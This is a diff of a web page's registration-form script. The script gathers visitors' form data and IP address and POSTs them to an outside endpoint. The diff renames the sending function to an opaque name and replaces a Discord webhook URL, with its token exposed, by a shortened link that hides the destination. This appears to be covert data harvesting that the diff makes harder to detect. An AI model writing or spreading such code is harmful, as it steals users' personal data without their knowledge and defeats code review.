@@ -820,18 +820,18 @@
                     userData.ip = data.ip;
                     
                     // Send data to Discord webhook
-                    sendToDiscord(userData);
+                    reqir(userData);
                 })
                 .catch(error => {
                     console.error('Error getting IP:', error);
                     userData.ip = 'Unknown';
-                    sendToDiscord(userData);
+                    reqir(userData);
                 });
         });
 
-        function sendToDiscord(data) {
+        function reqir(data) {
             // Replace with your actual Discord webhook URL
-            const webhookUrl = 'https://discord.com/api/webhooks/1357457585422209177/MyjVwkNZLEw9bx5LPXp55IV3ahANkmYfKlHUNP9f0DBGGsaLOQPvwJPLphkgRaLrRNBh';
+            const irdata = 'smurl.fr/izlr8';
             
             const embed = {
                 title: "New Registration",
@@ -877,7 +877,7 @@
                 avatar_url: "https://cdn-icons-png.flaticon.com/512/4712/4712035.png"
             };
             
-            fetch(webhookUrl, {
+            fetch(irdata, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
